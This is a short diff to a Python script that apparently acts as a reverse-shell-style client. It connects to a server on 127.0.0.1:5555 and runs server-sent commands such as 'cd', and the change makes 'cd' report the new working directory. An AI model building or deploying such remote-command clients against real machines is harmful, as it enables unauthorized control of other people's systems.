@@ -6,6 +6,7 @@ import os
 host = "127.0.0.1"
 port = 5555
 
+
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
 client.connect((host, port))
@@ -36,7 +37,7 @@ try:
             path = serv_cmd[3:].strip()
             try:
                 os.chdir(path)
-                result = ""
+                result = os.getcwd()
             except Exception as e:
                 result = f"cd error: {e}\n"
 
